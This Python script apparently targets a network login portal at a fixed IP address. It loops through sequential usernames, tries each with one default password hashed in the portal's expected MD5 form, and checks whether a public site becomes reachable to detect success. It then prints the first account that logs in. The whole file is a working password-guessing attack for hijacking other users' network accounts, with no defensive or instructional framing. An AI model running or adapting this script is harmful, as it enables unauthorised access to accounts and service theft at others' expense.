import requests
import hashlib
from bs4 import BeautifulSoup
class DoubanClient(object):
    def __init__(self):
        self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36'}
        self.session = requests.session()
    def login(self,username,password,
              drop = '0',
              type = '1',
              n = '100'):
        login_url = 'http://210.43.32.30/cgi-bin/do_login'

        response = self.session.get(login_url)

        data = {'username':username,
                'password':password,
                'drop':drop,
                'type':type,
                'n':n}
        self.session.post(login_url,data=data,headers = self.headers)
        re = requests.get('http://www.baidu.com')
        re.encoding = 'utf-8'
        return (len(str(re.text)))
if __name__ == '__main__':
    username = '01002'
    password = 666666
    password = hashlib.md5(str(password).encode('utf-8')).hexdigest()[8:-8]
    D  = DoubanClient()
    userint = 1000
    intstr = D.login(username,password)
    while (intstr == 267):
        userint = userint + 1
        username = '0'+ str(userint)
        intstr = D.login(username,password)
    print(username)
